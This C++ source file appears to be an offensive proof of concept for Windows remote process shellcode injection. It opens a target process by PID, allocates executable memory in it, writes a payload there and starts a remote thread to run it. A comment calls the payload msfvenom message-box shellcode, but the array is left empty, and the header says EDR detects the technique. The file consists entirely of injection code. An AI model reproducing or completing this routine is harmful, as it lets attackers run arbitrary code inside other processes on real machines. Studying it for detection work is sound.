// POC code for a failed attempt of shellcode injection. This is detected by EDR.

#include <Windows.h>
#include <stdio.h>

// msfvenom message box shellcode (x64)
unsigned char payload[] = {
	
};

int payloadLength = sizeof(payload);

int main(int argc, const char* argv[]) {
	if (argc < 2) {
		printf("Usage: detected.exe <PID>\n");
		return 0;
	}

	//  Get PID from cmd arg
	int pid = atoi(argv[1]);

	// Open the process (specified by PID)
	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid);

	// Allocate memory buffer in a remote process.
	void* pRemoteCode = VirtualAllocEx(hProcess, nullptr, payloadLength, MEM_COMMIT, PAGE_EXECUTE_READ);

	// Write process memory
	WriteProcessMemory(hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payloadLength, nullptr);

	// Create remote thread
	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, nullptr, 0, nullptr);

	WaitForSingleObject(hThread, 5000);
	CloseHandle(hThread);
	return 0;
}